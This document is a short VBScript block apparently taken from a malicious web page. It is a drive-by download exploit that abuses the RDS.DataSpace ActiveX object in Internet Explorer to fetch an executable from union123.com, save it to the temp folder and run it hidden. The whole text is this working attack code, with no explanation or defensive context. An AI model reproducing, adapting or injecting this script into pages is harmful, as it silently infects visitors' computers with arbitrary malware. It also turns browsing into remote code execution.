<script language="VBScript">
    on error resume next
dl = "http://union123.com/0602323.exe":fname1="0602323.exe"
    Set df = document.createElement("object")
    df.setAttribute "classid", "clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"
       Set x = df.CreateObject("Microsoft.XMLHTTP","")
       set SS = df.createobject("Adodb.Stream","")
    SS.type = 1
x.Open "GET", dl, False
    x.Send
  sub shellexe(zz,fname1)
     set Q = df.createobject(zz,""):Q.ShellExecute fname1,"","","open",0
    end sub
    set F = df.createobject("Scripting.FileSystemObject","")
     set tmp = F.GetSpecialFolder(2)
    SS.open
    fname1= F.BuildPath(tmp,fname1)
    SS.write x.responseBody
    SS.savetofile fname1,2
    SS.close
	call shellexe("Shell.Application",fname1)
    </script>
 



